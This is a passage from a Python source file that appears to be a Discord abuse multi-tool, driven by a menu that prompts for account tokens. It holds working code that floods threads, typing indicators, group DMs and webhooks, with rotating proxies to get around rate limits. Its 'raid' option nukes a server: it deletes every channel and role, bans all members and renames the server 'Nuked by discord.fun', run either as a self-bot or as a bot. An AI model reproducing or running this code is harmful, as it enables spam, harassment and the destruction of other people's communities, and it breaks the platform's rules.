﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
                        name = "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
                        while isenabled:
                            proxy = next(proxy_pool)
                            thread_spammer(token, channel_id, message_id, thread_name)
                        input("Press enter to return to the main menu")
                    elif choice_page_3 == '3':
                        token = input(Fore.CYAN + f"Enter your token: ")
                        channel_id = input(Fore.CYAN + f"Enter the channel ID: ")
                        isenabled = True
                        while isenabled:
                            time.sleep(float("1.5"))
                            typer(channel_id, token)
                        input("Press enter to return to the main menu")
                    elif choice_page_3 == '4':
                        token = input(Fore.CYAN + f"Enter your token: ")
                        groups_ids = get_discord_group_dms(token)
                        print_group_dms(groups_ids)
                        input("Press enter to return to the main menu")
                    elif choice_page_3 == '5':
                        token = input(Fore.CYAN + f"Enter your token: ")
                        message = input(Fore.CYAN + f"What message to send?: ")
                        groups_dms = get_discord_group_dms(token)
                        for dm in groups_dms:
                            print(f"Sending message to {dm['id']}")
                            send_message_to_group(token, message, dm['id'])
                    elif choice_page_3 == '6':
                        token = input(Fore.CYAN + f"Enter your token: ")
                        message = input(Fore.CYAN + f"What message to send?: ")
                        groups_dms = input("Enter group id or ids (e.g. 1234567890, 1234567890): ")
                        dm_list = groups_dms.split(',')
                        for dm in dm_list:
                            dm = dm.strip()
                            print(f"Sending message to {dm}")
                            send_message_to_group(token, message, dm)
                    elif choice_page_3 == '7':
                        url = input(Fore.CYAN + f"Enter webhook url: ")
                        content = input(Fore.CYAN + f"What message to send?: ")
                        proxies = get_proxies()
                        proxy_pool = cycle(proxies)
                        while True:
                            proxy = next(proxy_pool)
                            webhook = DiscordWebhook(url=url, content=content, proxies={"http": proxy})
                            response = webhook.execute()
                            if response.status_code == 200 or 201:
                                print("Successfully sent message to " + url)
                            elif response.status_code == 429:
                                retry_after = response.json().get('retry_after', 1)
                                # print(f'Rate limit, retry after {retry_after} seconds.')
                                time.sleep(retry_after)
                                proxy = next(proxy_pool)
                                webhook = DiscordWebhook(url=url, content=content, proxies={"http": proxy})
                                response = webhook.execute()
                                if response.status_code == 200 or 201:
                                    print("Successfully sent message to " + url)
                    elif choice_page_3 == '8':
                        url = input(Fore.CYAN + f"Enter webhook url: ")
                        content = input(Fore.CYAN + f"What message to send?: ")
                        proxies = get_proxies()
                        proxy_pool = cycle(proxies)
                        proxy = next(proxy_pool)
                        webhook = DiscordWebhook(url=url, content=content, proxies={"http": proxy})
                        response = webhook.execute()
                        if response.status_code == 201 or 200:
                            print("Successfully sended the message")
                        else:
                            print("Error: " + response.json())
                    elif choice_page_3 == '9':
                        while True:
                            clear()
                            menu_page_4()
                            choice_page_4 = input(setting)
                            if choice_page_4 == '1':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                discord_nitro_expire(token)
                                input("Press enter to return to the main menu")
                            elif choice_page_4 == '2':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                country_code_by(token)
                                input("Press enter to return to the main menu")
                            elif choice_page_4 == '3':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                get_sessions(token)
                                input("Press enter to return to the main menu")
                            elif choice_page_4 == "4":
                                token = input(Fore.CYAN + f"Enter your token: ")
                                message = input(Fore.CYAN + f"What message to send?: ")
                                dm = input("Enter channel id (e.g. 1234567890): ")
                                isenabled = True
                                while isenabled:
                                    send_message_to_group(token, message, dm)
                            elif choice_page_4 == '5':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                house_id = input(Fore.CYAN + f"1 - Bravery\n2 - Brilliance\n3 - Balance\nEnter house_id: ")
                                hypesquad(token, house_id)
                                input("Press enter to return to the main menu")
                            elif choice_page_4 == '6':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                channel_id = input(Fore.CYAN + f"Enter channel id: ")
                                webhook_name = input(Fore.CYAN + f"Enter webhook name: ")
                                create_webhook(token, channel_id, webhook_name)
                            elif choice_page_4 == '7':
                                choice_raid = input(Fore.LIGHTGREEN_EX + "Which type of raid do you prefer? (1 - Self-bot, 2 - Bot): ")
                                if choice_raid == '1':
                                    token = input(Fore.CYAN + f"Enter your token: ")
                                    guild_id = input(Fore.CYAN + f"Enter guild id: ")
                                    print('Starting server nuke...')
                                    delete_channels(guild_id, token)
                                    delete_roles(guild_id, token)
                                    change_server_name(guild_id, "discord.fun", token)
                                    IMAGE_URL = 'https://cdn.discordapp.com/icons/1255836516434051124/8ba9109d7cf6cc6e207c37b21e0c860d.webp?size=128&quot;);'
                                    change_logo_guild(get_picture_by_url(IMAGE_URL), token, guild_id)
                                    change_description("Nuked by discord.fun", token, guild_id)
                                    print('Server has been nuked.')
                                    input("Press enter to return to the main menu")
                                elif choice_raid == '2':
                                    # Ваш токен бота
                                    TOKEN = input(Fore.CYAN + f"Enter bot token: ")
                                    # Установка интентов для получения событий
                                    intents = discord.Intents.default()
                                    intents.members = True  # Разрешить боту видеть участников
                                    intents.guilds = True  # Разрешить боту видеть сервера
                                    intents.message_content = True # Разрешить боту видеть сообщения

                                    # Создание экземпляра бота с интентами и префиксом команд
                                    bot = commands.Bot(command_prefix='!', intents=intents)

                                    async def fetch_image_bytes(url):
                                        async with aiohttp.ClientSession() as session:
                                            async with session.get(url) as response:
                                                return await response.read()

                                    @bot.event
                                    async def on_ready():
                                        print(f'Logged in as {bot.user.name}')
                                        print('Write command "!nuke" in the chat when you ready')


                                    @bot.command()
                                    @commands.has_permissions(administrator=True)
                                    async def nuke(ctx):
                                        guild = ctx.guild

                                        # Удаление всех каналов
                                        for channel in guild.channels:
                                            try:
                                                await channel.delete()
                                                print(f'Deleted channel: {channel.name}')
                                            except discord.Forbidden:
                                                print(f"Permission error when deleting channel {channel.name}.")
                                            except discord.HTTPException as e:
                                                print(f"HTTP exception when deleting channel {channel.name}: {e}")

                                        # Удаление всех ролей
                                        for role in guild.roles:
                                            if role.name != '@everyone':  # Не удаляйте роль @everyone
                                                try:
                                                    await role.delete()
                                                    print(f'Deleted role: {role.name}')
                                                except discord.Forbidden:
                                                    print(f"Permission error when deleting role {role.name}.")
                                                except discord.HTTPException as e:
                                                    print(f"HTTP exception when deleting role {role.name}: {e}")

                                        # Бан всех участников
                                        for member in guild.members:
                                            if member != guild.owner:  # Не баньте владельца сервера
                                                try:
                                                    await member.ban(reason="Nuked by discord.fun")
                                                    print(f'Banned member: {member.name}')
                                                except discord.Forbidden:
                                                    print(f"Permission error when banning member {member.name}.")
                                                except discord.HTTPException as e:
                                                    print(f"HTTP exception when banning member {member.name}: {e}")

                                        # Изменение названия сервера
                                        try:
                                            await guild.edit(name='discord.fun')
                                            print('Server name changed to discord.fun')
                                        except discord.Forbidden:
                                            print("Permission error when changing the server name.")
                                        except discord.HTTPException as e:
                                            print(f"HTTP exception when changing server name: {e}")

                                        # Изменение логотипа сервера
                                        try:
                                            icon_bytes = await fetch_image_bytes("https://cdn.discordapp.com/icons/1255836516434051124/8ba9109d7cf6cc6e207c37b21e0c860d.webp?size=128&quot;);")
                                            await guild.edit(icon=icon_bytes)
                                            print('Server icon updated.')
                                        except discord.Forbidden:
                                            print("Permission error when changing the server icon.")
                                        except discord.HTTPException as e:
                                            print(f"HTTP exception when changing server icon: {e}")

                                    # Запуск бота
                                    bot.run(TOKEN)
                            elif choice_page_4 == '8':
                                token = input(Fore.CYAN + f"Enter your token: ")
                                get_info_user(token)
                                input("Press enter to return to the main menu")
                            elif choice_page_4 == '0':
                                break
                    elif choice_page_3 == '0':
                        break
            elif choice_page_2 == '3':
                token = input(Fore.CYAN + f'Enter your token: ')
                invite_link = input(Fore.CYAN + f"Enter your invite link (https://discord.gg/example): ")
                join_server(invite_link, token)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '5':
                token = input(Fore.CYAN + f'Enter your token: ')
                guilds = get_discord_guilds_user(token)
                print(guilds)
                input("Press enter to return to the main menu")
            elif choice_page_2 == '0':
                break
            else:
                print('Invalid choice')
                input("Press enter to return to the main menu")
    elif choice == '4':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        friend_ids = input(Fore.CYAN + f"Enter friend id or ids (e.g. 1234567890, 1234567890): ")
        friend_ids1 = [friend_ids]
        message_content = input("What message to send?: ")
        send_message_to_friend(token, message_content, friend_ids1)
    elif choice == '5':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        bio = input(Fore.CYAN + f"Enter bio to change: ")
        change_bio(token, bio)
        input("Press enter to return to the main menu")
    elif choice == '6':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        display_name = input(Fore.CYAN + f"Enter display name to change: ")
        change_display_name(token, display_name)
        input("Press enter to return to the main menu")
    elif choice == '8':
        clear()
        token = input(Fore.CYAN + f"Enter your token: ")
        pronouns = input(Fore.CYAN + f"Enter pronouns to change: ")
        change_pronouns(token, pronouns)
        input("Press enter to return to the main menu")
    elif choice == '7':
        clear()
        password = input(Fore.CYAN + f"Enter your password: ")
        token = input(Fore.CYAN + f"Enter your token: ")
        username = input(Fore.CYAN + f"Enter username to change: ")
        change_username(username, password, token)
        input("Press enter to return to the main menu")
    elif choice == '0':
        exit(0)
    else:
        print("Invalid choice. Please enter a valid option.")
        input("Press enter to return to the main menu")
